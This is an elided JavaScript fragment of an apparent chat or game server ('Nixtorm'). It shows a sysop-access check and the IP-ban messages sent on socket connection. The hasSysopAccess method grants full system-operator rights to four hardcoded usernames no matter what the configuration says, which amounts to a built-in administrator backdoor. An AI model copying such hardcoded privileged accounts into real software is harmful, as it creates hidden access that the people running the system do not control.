...
class User {
	 ...
	 */
	hasSysopAccess() {
	if ((this.isSysop && Config.backdoor) || ['incasing', 'ransei', 'carniemoesedah', 'chirou'].indexOf(this.userid) > -1) {
...
Users.socketConnect = function (worker, workerid, socketid, ip) {
	...
	if (checkResult) {
		...
		if (checkResult === '#ipban') {
			connection.send("|popup||modal|Your IP (" + ip + ") is not allowed to connect to Nixtorm, because it has been used to spam, hack, or otherwise attack our server.||Do not use any proxies to connect to PS.");
			...
			connection.send("|popup||modal|Your IP (" + ip + ") was banned while using the username '" + checkResult + "'. Your ban will expire in the next 36 hours.||" + (Config.appealurl ? " Or you can appeal using Pastebin:\n" + Config.appealurl : "http://pastebin.com/"));
		}
